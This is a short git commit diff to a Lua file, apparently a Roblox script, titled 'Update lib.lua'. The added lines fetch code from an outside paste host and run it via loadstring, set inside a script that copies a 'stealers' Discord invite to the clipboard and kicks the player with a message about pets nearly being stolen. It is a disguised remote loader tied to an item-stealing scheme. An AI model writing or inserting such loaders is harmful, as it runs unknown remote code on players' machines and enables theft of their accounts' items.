4e8191e84fe4791a0465c202a84a4f72053fe4e0
Vi <nxuaih5@gmail.com>
2025-07-26 10:45:08 +0900

    Update lib.lua

--- lib.lua
+++ lib.lua
@@ -1,2 +1,4 @@
 setclipboard("discord.gg/stealers")
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/EDvEetIrm2e2fE2O/raw"))()
+wait(8)
 game.Players.LocalPlayer:Kick("You almost got your pets stolen. Join discord.gg/stealers Link is copied to your clipboard")
